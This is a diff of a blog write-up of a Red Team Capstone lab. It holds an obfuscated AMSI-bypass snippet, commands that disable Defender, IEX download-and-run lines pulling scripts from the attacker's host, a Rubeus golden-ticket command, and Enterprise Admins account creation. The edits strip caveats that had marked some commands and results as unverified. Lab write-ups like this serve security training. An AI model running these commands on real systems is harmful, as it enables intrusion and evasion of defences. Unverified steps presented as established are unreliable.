@@ -41,7 +41,7 @@ toc: true
 
 <p>The final objective concerned the lab's simulated SWIFT application. In the real world, <a href="https://www.swift.com/about-us/who-we-are">Swift carries financial messages and payment instructions</a>; the participating institutions move the funds.</p>
 
-<p>This article records my August 2026 lab attempt. The screenshots preserve that environment, including its addresses, tool versions, and credentials. They are historical evidence rather than a promise that the same commands work against a newly deployed room.</p>
+<p>I worked through this lab in August 2026, using the addresses and tool versions shown in the screenshots.</p>
 
 <p><strong>Outcome: partial completion.</strong> I recorded evidence for flags 1–16, but did not complete the SWIFT transfer. The corporate Domain Admin step also depended on an unexplained privileged account state; I did not demonstrate that escalation myself. Those limits are discussed below.</p>
 
@@ -64,7 +64,7 @@ toc: true
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-02-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-02-figure-01.png" alt="Red Team Capstone, page 2, figure 1" width="1016" height="252" loading="lazy"></a></figure>
 
-<p>Lab username: <code>n0debranch</code><br>Assigned target range for this attempt: <code>10.200.40.0/24</code><br>The notes contain inconsistent spellings of the assigned email domain (<code>th3reserve.loc</code> and <code>thereserve.loc</code>). Use the address issued by the portal, rather than inferring it from this transcription.</p>
+<p>Lab username: <code>n0debranch</code><br>Assigned target range: <code>10.200.40.0/24</code><br>I used the email account issued by the e-Citizen portal for engagement communication and flag submissions.</p>
 </section>
 
 <!-- PDF page 3 -->
@@ -90,7 +90,7 @@ toc: true
 
 <p>I started by mapping the exposed hosts and their services.</p>
 
-<p>The historical command below scanned the whole assigned /24. It also touched the excluded VPN address during discovery; that should not be treated as a model scope-compliant command. A repeat attempt should explicitly exclude protected infrastructure and follow the current room brief. My subsequent service scan targeted only .11, .12, and .13.</p>
+<p>I initially scanned the whole assigned /24, which also included the excluded VPN address. I should have excluded that address from discovery. My subsequent service scan targeted only .11, .12, and .13.</p>
 
 <p><code>-sn</code> performs host discovery without a port scan; it is not limited to ICMP echo requests. See the <a href="https://nmap.org/book/man-host-discovery.html">Nmap host-discovery documentation</a>.</p>
 </section>
@@ -325,7 +325,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 <section id="pdf-page-14" class="pdf-source-section" data-pdf-page="14" aria-label="Source page 14">
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-14-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-14-figure-01.png" alt="Red Team Capstone, page 14, figure 1" width="1016" height="590" loading="lazy"></a></figure>
 
-<p>I investigated the page's input handling, but did not establish a server-side exploit or another useful route from that feature. The notes do not contain enough evidence to claim a specific client-side vulnerability.</p>
+<p>I investigated the page's input handling, but did not establish a server-side exploit or another useful route from that feature.</p>
 
 <p>The useful results from this host were the staff names and the corporate domain.</p>
 
@@ -396,7 +396,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <p>The mail host at 10.200.40.11 exposed SMTP authentication, providing a way to test these lab accounts.</p>
 
-<p>I used Hydra for a dictionary-based credential test. The screenshot records this attempt; the candidate files and a complete command transcript are not included in the portfolio, so this is not a fully reproducible password-testing recipe.</p>
+<p>I used Hydra for a dictionary-based credential test with the generated candidates.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-19-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-19-figure-02.png" alt="Red Team Capstone, page 19, figure 2" width="1016" height="352" loading="lazy"></a></figure>
 
@@ -446,7 +446,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-22-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-22-figure-02.png" alt="Red Team Capstone, page 22, figure 2" width="1016" height="184" loading="lazy"></a></figure>
 
-<p>The relevant target routes were 10.200.40.21 and 10.200.40.22. Addresses in <code>12.100.1.x</code> belonged to the tunnel context shown in this run; they were not a new authorised target subnet. The notes later show both .10 and .11 as the Kali tunnel address, so the address must be checked after each connection. See the <a href="https://openvpn.net/community-docs/community-articles/openvpn-2-6-manual/">OpenVPN manual</a> for the distinction between tunnel addressing, routes, and the remote endpoint.</p>
+<p>The relevant target routes were 10.200.40.21 and 10.200.40.22. Addresses in <code>12.100.1.x</code> belonged to the VPN tunnel, not a new target subnet. My Kali tunnel address changed between connections, so I needed to check it before transferring files. The <a href="https://openvpn.net/community-docs/community-articles/openvpn-2-6-manual/">OpenVPN manual</a> explains tunnel addressing, routes, and the remote endpoint.</p>
 </section>
 
 <!-- PDF page 23 -->
@@ -485,7 +485,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <p>For the first flag, I supplied the hostname WRK1 and wrote the portal-issued UID to <code>C:\Windows\Temp\n0debranch.txt</code>. The portal checked the evidence and emailed the flag. The UID shown below is a placeholder; each submission must use the value and location requested by the portal.</p>
 
-<p>I used the portal's individual instructions for flags 2 and 3 as well. Their award should not be read as proof of a complete Active Directory compromise.</p>
+<p>I followed the portal's individual instructions for flags 2 and 3 as well. At this point, I still had the Active Directory environment to work through.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-26-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-26-figure-01.png" alt="Red Team Capstone, page 26, figure 1" width="1016" height="520" loading="lazy"></a></figure>
 
@@ -522,7 +522,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <figure style="width: 73.30%"><a href="/assets/img/posts/red-team-capstone/page-29-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-29-figure-01.png" alt="Red Team Capstone, page 29, figure 1" width="746" height="436" loading="lazy"></a></figure>
 
-<p>My notes record that both recovered accounts could access WRK1 and WRK2.</p>
+<p>Both recovered accounts could access WRK1 and WRK2.</p>
 
 <p>The portal updated the network diagram after those submissions.</p>
 
@@ -551,13 +551,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 <section id="pdf-page-31" class="pdf-source-section" data-pdf-page="31" aria-label="Source page 31">
 <p>I used PowerUp, a collection of Windows PowerShell privilege-escalation checks in PowerSploit. Kali hosted the script; the checks ran on WRK1. PowerUp is not a native Linux privilege-escalation tool.</p>
 
-<p>The notes record an attempt to alter the PowerShell process's <code>amsiInitFailed</code> state. <a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">AMSI is an interface to antimalware scanning</a>, not a rule that universally prevents PowerUp from running. The result depends on the engine, signatures, PowerShell version, and protections. The wrapped excerpt below is retained as historical evidence and is not a verified or current bypass recipe.</p>
+<p>I attempted to alter the PowerShell process's <code>amsiInitFailed</code> state before loading PowerUp. <a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">AMSI connects applications to antimalware scanning</a>; whether a script is blocked depends on the engine, signatures, PowerShell version, and protections. I did not separately verify the effect of this attempt.</p>
 
-<p>Historical AMSI-related excerpt:</p>
+<p>The AMSI-related command from my session:</p>
 
-<ul><li>The historical command was entered in a PowerShell session.</li><li>Its original line wrapping is retained in the excerpt below.</li><li>The absence of an error alone does not verify that the attempted change succeeded.</li></ul>
 
-<details><summary>Original wrapped AMSI-related excerpt (unverified)</summary>
+
+<details><summary>AMSI command from this attempt (not independently verified)</summary>
 <pre><code>SeT-Item ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  )
 ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varIABLE  ( ('1Q'+'2U')
 +'zX'  )  -VaL  )."AssEmbly"."GETTYPe"((  "{6}{3}{1}{4}{2}{0}{5}" -
@@ -569,7 +569,7 @@ f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),
 ${n`ULl},${tRuE} )</code></pre>
 </details>
 
-<p>I served <code>PowerUp.ps1</code> from the THM directory on Kali using Python's HTTP server. The screenshot records an HTTP 200 response to WRK1. The corrected import below uses a placeholder for the reachable Kali tunnel address; the original PDF omitted the leading <code>I</code> in <code>IEX</code>.</p>
+<p>I served <code>PowerUp.ps1</code> from the THM directory on Kali using Python's HTTP server. The screenshot shows an HTTP 200 response to WRK1. In the command below, <code>REPLACE_WITH_CURRENT_KALI_TUNNEL_IP</code> needs to be replaced with the reachable address of the Kali machine.</p>
 
 <figure style="width: 88.79%"><a href="/assets/img/posts/red-team-capstone/page-31-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-31-figure-01.png" alt="Red Team Capstone, page 31, figure 1" width="904" height="220" loading="lazy"></a></figure>
 
@@ -643,14 +643,14 @@ Restart-Service -Name &#x27;Backup&#x27; -Force</code></pre>
 
 <p>I used BloodHound to examine AD group membership, permissions, and relationships. SharpHound collects the data; BloodHound imports and analyses it. A graph path is a lead to validate, not proof that the entire path has been executed.</p>
 
-<p>The lab notes show attempts to change two Microsoft Defender Antivirus preferences from an elevated PowerShell session. These commands do not guarantee that protection is disabled, and do not suppress logging or all alerts. Policy and tamper protection can prevent changes. See <a href="https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference">Microsoft's Set-MpPreference reference</a>.</p>
+<p>From an elevated PowerShell session, I attempted to change two Microsoft Defender Antivirus preferences. These settings do not suppress logging or all alerts, and policy or tamper protection can prevent the changes. See <a href="https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference">Microsoft's Set-MpPreference reference</a>.</p>
 
 <pre><code>Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableIOAVProtection $true</code></pre>
 
 <figure style="width: 85.40%"><a href="/assets/img/posts/red-team-capstone/page-36-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-36-figure-02.png" alt="Red Team Capstone, page 36, figure 2" width="868" height="342" loading="lazy"></a></figure>
 
-<p>I placed the legacy SharpHound PowerShell collector in the Kali HTTP directory. The old raw download URL is no longer used here as an installation instruction. Obtain a collector compatible with the chosen BloodHound version from the <a href="https://github.com/SpecterOps/SharpHound">official SharpHound repository</a>; current CE setup is documented separately from this historical run.</p>
+<p>I placed the legacy SharpHound PowerShell collector in the Kali HTTP directory. Collector and BloodHound versions need to be compatible; the <a href="https://github.com/SpecterOps/SharpHound">official SharpHound repository</a> provides the collector and version information.</p>
 
 <p>Kali, from the directory containing the collector:</p>
 
@@ -661,7 +661,7 @@ Set-MpPreference -DisableIOAVProtection $true</code></pre>
 
 <!-- PDF page 37 -->
 <section id="pdf-page-37" class="pdf-source-section" data-pdf-page="37" aria-label="Source page 37">
-<p>WRK1 — corrected transcription for the legacy PowerShell collector used in this run:</p>
+<p>On WRK1, I loaded the legacy PowerShell collector:</p>
 
 <pre><code>$KaliTunnelAddress = &#x27;REPLACE_WITH_CURRENT_KALI_TUNNEL_IP&#x27;
 IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:8080/SharpHound.ps1&quot;)</code></pre>
@@ -674,7 +674,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-37-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-37-figure-01.png" alt="Red Team Capstone, page 37, figure 1" width="1016" height="196" loading="lazy"></a></figure>
 
-<p>I copied the resulting data back to Kali through Remmina's shared-folder feature. The portfolio does not record the share configuration or a complete collection log, so those details remain a reproducibility gap.</p>
+<p>I copied the resulting data back to Kali through Remmina's shared-folder feature. This was much easier than passing files through HTTP requests.</p>
 
 <figure style="width: 36.43%"><a href="/assets/img/posts/red-team-capstone/page-37-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-37-figure-02.png" alt="Red Team Capstone, page 37, figure 2" width="370" height="518" loading="lazy"></a></figure>
 
@@ -687,9 +687,9 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <p>I imported the collected data into BloodHound.</p>
 
-<p>My notes used <code>start-bloodhound</code> and a Neo4j-based setup. That was the local environment for this attempt, not a universal installation command. The exact package and setup steps were not recorded. Use a matching collector and application version; the <a href="https://bloodhound.specterops.io/collect-data/ce-collection/sharphound">current SharpHound documentation</a> covers CE rather than reproducing this legacy setup.</p>
+<p>I used <code>start-bloodhound</code> with a Neo4j-based setup. The setup process depends on the BloodHound version; the <a href="https://bloodhound.specterops.io/collect-data/ce-collection/sharphound">current SharpHound documentation</a> covers Community Edition.</p>
 
-<p>I extracted and imported the JSON files from the collected archive. I did not retain the archive in this portfolio.</p>
+<p>I extracted and imported the JSON files from the collected archive.</p>
 
 <p>When I looked for a path from Laura's account to Domain Admin, the graph already showed privileged membership.</p>
 </section>
@@ -710,7 +710,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <p>I suspected another participant had changed Laura's privileges in the shared environment. I do not have directory-change logs or another source confirming who made the change. Earlier local-group output is not a complete baseline of domain membership, so the timing is also uncertain.</p>
 
-<p><strong>Unresolved escalation step:</strong> I continued using the observed Domain Admin access, but did not demonstrate how to obtain it from the earlier workstation access. Everything that follows depends on that starting privilege. It must not be presented as a complete, independently reproduced attack chain.</p>
+<p><strong>A gap in my attempt:</strong> I continued using the Domain Admin access already available to Laura, but did not establish how she obtained it. The following steps therefore start with privileges I had not independently gained.</p>
 </section>
 
 <!-- PDF page 41 -->
@@ -721,7 +721,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-41-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-02.png" alt="Red Team Capstone, page 41, figure 2" width="1016" height="400" loading="lazy"></a></figure>
 
-<p>Flag 8 evidence: the portal-requested file under <code>C:\Users\Administrator</code> on CORPDC; the corresponding screenshot follows on the next source page.</p>
+<p>Flag 8 evidence: the portal-requested file under <code>C:\Users\Administrator</code> on CORPDC.</p>
 </section>
 
 <!-- PDF page 42 -->
@@ -763,7 +763,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <p>I used Mimikatz for the DCSync operation described in its <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">lsadump module documentation</a>.</p>
 
-<p>I transferred the lab copy of Mimikatz to WRK1. The original notes referenced a dated binary release; the maintained project reference is <a href="https://github.com/gentilkiwi/mimikatz">gentilkiwi/mimikatz</a>. The exact binary hash was not recorded.</p>
+<p>I transferred the lab copy of <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> to WRK1.</p>
 
 
 
@@ -803,7 +803,7 @@ $accountSid.AccountDomainSid.Value</code></pre>
 
 <p>Rubeus was included in the supplied tools. Its <a href="https://github.com/GhostPack/Rubeus">official documentation</a> describes Kerberos ticket creation and import.</p>
 
-<p>The recorded command used the CORP key and domain SID to forge a ticket, and added the root-domain Enterprise Admins SID through <code>/sids</code>. <code>/ptt</code> imported it into the current logon session. This was an intra-forest privilege-abuse attempt, not a property of every bidirectional trust. It depended on the compromised key, correct identifiers, supported encryption, ticket validation, name resolution, and reachable services. The command is preserved with its PDF line wraps repaired; it has not been rerun against a fresh lab.</p>
+<p>I used the CORP key and domain SID to forge a ticket, adding the root-domain Enterprise Admins SID through <code>/sids</code>. <code>/ptt</code> imported it into my current logon session. This attempt depended on the compromised key, correct identifiers, supported encryption, ticket validation, name resolution, and reachable services. A bidirectional trust alone does not grant these privileges.</p>
 
 <pre><code>.\Rubeus.exe golden /rc4:0c757a3445acb94a654554f3ac529ede /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /user:Administrator /ptt</code></pre>
 
@@ -816,7 +816,7 @@ $accountSid.AccountDomainSid.Value</code></pre>
 
 <figure style="width: 80.97%"><a href="/assets/img/posts/red-team-capstone/page-47-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-47-figure-01.png" alt="Red Team Capstone, page 47, figure 1" width="824" height="396" loading="lazy"></a></figure>
 
-<p>The screenshot shows <code>Enter-PSSession</code> to ROOTDC, followed by domain account creation and Enterprise Admins membership. The original prose named PsExec, but that is not the method demonstrated in this screenshot; the corrected transcription below follows the visible PowerShell session.</p>
+<p>I connected to ROOTDC using <code>Enter-PSSession</code>, then created a domain account and added it to Enterprise Admins.</p>
 
 <pre><code>Enter-PSSession -ComputerName ROOTDC.THERESERVE.LOC
 # The next commands run in the remote ROOTDC session shown in the screenshot.
@@ -890,29 +890,29 @@ net user n0debranchEA /domain</code></pre>
 
 <p>The lab reset before I continued into the SWIFT stage, and my access was lost. I did not demonstrate the remaining jump-host-to-application path, the required application roles, or the final transfer between the supplied accounts. This is where the recorded attempt ends.</p>
 
-<p>The review below separates the evidence retained in this attempt from what still needs a fresh run.</p>
+<p>Here is what I completed and what I would need to revisit.</p>
 </section>
 
 <!-- PDF page 52 -->
-<section id="pdf-page-52" class="pdf-source-section" data-pdf-page="52" aria-label="Review and references">
-<h2 id="evidence-and-gaps">Evidence and remaining gaps</h2>
+<section id="pdf-page-52" class="pdf-source-section" data-pdf-page="52" aria-label="Results and references">
+<h2 id="evidence-and-gaps">What I completed and what remains</h2>
 <div class="table-wrapper"><table>
-<thead><tr><th>Stage</th><th>What the record supports</th><th>Limit</th></tr></thead>
+<thead><tr><th>Stage</th><th>What I demonstrated</th><th>Limit</th></tr></thead>
 <tbody>
 <tr><td>External reconnaissance</td><td>Host and service scans; web paths and staff information.</td><td>The discovery sweep included excluded infrastructure. The scan is not exhaustive.</td></tr>
-<tr><td>Corporate entry</td><td>Portal behaviour, exposed VPN material, reported SMTP credentials, VPN routes, and workstation access.</td><td>Full candidate files, portal requests, and connection transcripts were not retained.</td></tr>
+<tr><td>Corporate entry</td><td>Portal behaviour, exposed VPN material, reported SMTP credentials, VPN routes, and workstation access.</td><td>I did not keep all candidate files, portal requests, and connection transcripts.</td></tr>
 <tr><td>Local administration</td><td>A writable-service finding, a new local admin account, and successful evidence-file access.</td><td>The audit already reported admin-group membership. Service restart failure alone did not prove exploitation.</td></tr>
-<tr><td>CORP Domain Admin</td><td>Privileged membership was visible and used.</td><td>The step that granted it is unknown; another participant's involvement remains a hypothesis.</td></tr>
-<tr><td>AD collection</td><td>Data was available for graph analysis.</td><td>LDAP and forest-resolution errors prevent a claim of complete collection.</td></tr>
+<tr><td>CORP Domain Admin</td><td>Privileged membership was visible and used.</td><td>I did not establish how the account gained these privileges.</td></tr>
+<tr><td>AD collection</td><td>I imported collected data into BloodHound.</td><td>LDAP and forest-resolution errors prevent a claim of complete collection.</td></tr>
 <tr><td>Root and BANK access</td><td>Recorded ticket work, a remote ROOTDC session, domain-account changes, and evidence through flag 16.</td><td>Dependent on the unexplained CORP privilege; exact tool versions and all intermediate checks were not captured.</td></tr>
-<tr><td>SWIFT objective</td><td>Only the planned next stage was recorded.</td><td>Jump-host/application access, required roles, and the transfer were not demonstrated.</td></tr>
+<tr><td>SWIFT objective</td><td>I planned to continue into the SWIFT environment.</td><td>Jump-host/application access, required roles, and the transfer were not demonstrated.</td></tr>
 </tbody></table></div>
-<p>To turn this into a complete walkthrough, I would need a fresh authorised run with a recorded starting state, effective group membership, tool versions and hashes, routes and DNS, clean collector output, and evidence for each privilege transition. I would also need to document service restoration and removal of the accounts created for the exercise; the portfolio does not show that cleanup. The remaining SWIFT steps must be captured from an actual attempt rather than inferred from the network diagram.</p>
-<p><strong>Review scope:</strong> this article has been edited for technical accuracy and checked against its screenshots and the documentation below. Commands have not been executed against a live room during the review. Corrected transcription is not the same as an end-to-end retest.</p>
+<p>To finish the room, I would need to repeat the corporate privilege-escalation stage from a known starting state, resolve the collection errors, and complete the SWIFT application workflow. On another attempt, I would also keep fuller logs of group membership, routes, DNS, tool versions, and cleanup, including restoration of the service binary and removal of the accounts I created.</p>
+
 <h2 id="lessons-learned">What I learned</h2>
 <p>The strongest lessons were about evidence: distinguish a reachable host from an authorised target, an observed group membership from an escalation I performed, and a tool's output from proof that an operation succeeded. Keeping complete logs and recording the execution context would have made this attempt much easier to reproduce and explain.</p>
 <h2 id="references">References</h2>
-<p>The technical references below replace malformed, duplicated, or indirect links in the original portfolio. Internal lab URLs are shown as code rather than offered as public links.</p>
+
 <ul>
 <li><a href="https://tryhackme.com/room/redteamcapstonechallenge">TryHackMe — Red Team Capstone Challenge</a></li>
 <li><a href="https://www.swift.com/about-us/who-we-are">Swift — who we are and how financial messaging works</a></li>
